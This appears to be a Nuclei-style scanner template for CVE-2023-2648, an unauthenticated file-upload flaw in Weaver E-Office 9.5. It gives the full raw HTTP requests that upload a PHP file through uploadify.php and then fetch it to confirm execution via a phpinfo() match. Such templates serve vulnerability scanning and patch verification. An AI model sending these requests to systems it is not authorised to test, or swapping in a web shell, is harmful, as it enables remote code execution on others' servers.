info:
  name: E-office 任意文件上传-uploadify.php
  author: Rabb1ter
  severity: critical
  description: 'A vulnerability was found in Weaver E-Office 9.5. It has been classified
    as critical. This affects an unknown part of the file /inc/jquery/uploadify/uploadify.php.
    The manipulation of the argument Filedata leads to unrestricted upload. It is
    possible to initiate the attack remotely. The exploit has been disclosed to the
    public and may be used. The identifier VDB-228777 was assigned to this vulnerability.
    NOTE: The vendor was contacted early about this disclosure but did not respond
    in any way.'
  reference:
    - https://vuldb.com/?ctiid.228777
    - https://vuldb.com/?id.228777
    - https://github.com/sunyixuan1228/cve/blob/main/weaver.md
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-2648
    cwe-id: CWE-434
  tags: cve,cve2023,E-office,upload,file-upload,eco
requests:
  - raw:
      - |
        POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: test
        Content-Length: 493
        Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
        Accept-Encoding: gzip

        --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
        Content-Disposition: form-data; name="Filedata"; filename="666.php"
        Content-Type: application/octet-stream

        <?php phpinfo();?>
        --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
        --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85
        Content-Disposition: form-data; name="file"; filename=""
        Content-Type: application/octet-stream

        --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--
      - |
        GET /attachment/{{randkey}}/666.php HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        name: randkey
        part: body
        internal: true
        regex:
          - '^\d{10}$'
    matchers:
      - type: regex
        regex:
          - "PHP Version"
        part: body